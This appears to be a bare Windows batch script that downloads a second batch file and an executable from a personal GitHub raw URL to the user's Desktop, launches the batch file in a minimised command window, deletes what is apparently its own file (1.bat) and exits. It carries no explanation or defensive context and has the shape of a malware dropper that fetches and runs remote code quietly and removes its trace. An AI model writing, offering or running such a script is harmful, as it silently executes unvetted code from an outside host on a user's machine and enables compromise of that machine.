cd %USERPROFILE%\Desktop
curl -o run.bat https://raw.githubusercontent.com/oogabooga245/-/main/run.bat
curl -o name.exe https://raw.githubusercontent.com/oogabooga245/-/main/name.exe
START /MIN CMD.EXE /C run.bat
del 1.bat
exit
